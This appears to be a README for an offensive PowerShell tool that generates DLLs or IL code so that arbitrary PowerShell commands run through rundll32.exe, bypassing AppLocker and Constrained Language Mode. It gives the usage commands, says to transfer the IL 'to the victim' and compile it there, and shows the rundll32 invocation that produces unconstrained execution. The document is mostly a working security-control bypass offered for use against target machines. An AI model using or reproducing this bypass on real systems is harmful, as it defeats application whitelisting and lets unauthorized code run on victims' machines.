# Invoke-SeeEllEm
Automated Applocker/CLM dll generation which executes arbitrary powershell commands through rundll32.exe 


**Usage:**
```powershell
ipmo .\Invoke-SeeEllEm; Create-AppIl -DllName "ayylmao" -Entry "Poon" -Command "$ExecutionContext.SessionState.LanguageMode > C:\Windows\Tasks\bypass.txt" -Build
```
- Generates a dll called ayylmao.dll with the entrypoint of Poon with the command $ExecutionContext.SessionState.LanguageMode > C:\Windows\Tasks\bypass.txt

```powershell
ipmo .\Invoke-SeeEllEm; Create-AppIl -Entry "Poon" -Command "$ExecutionContext.SessionState.LanguageMode > C:\Windows\Tasks\bypass.txt"
```
- Generates a il to be transferred to the victim & compiled there, useful combined with https://github.com/FortyNorthSecurity/CLM-Base64 (Takes utf-8 not utf-16LE like windows powershell base64 does so cat file.il | base64 -w0)



`rundll32.exe Dllname.dll,EntryChosen`
- will execute in Unconstrained Language Mode if you have done your enum properly ;)
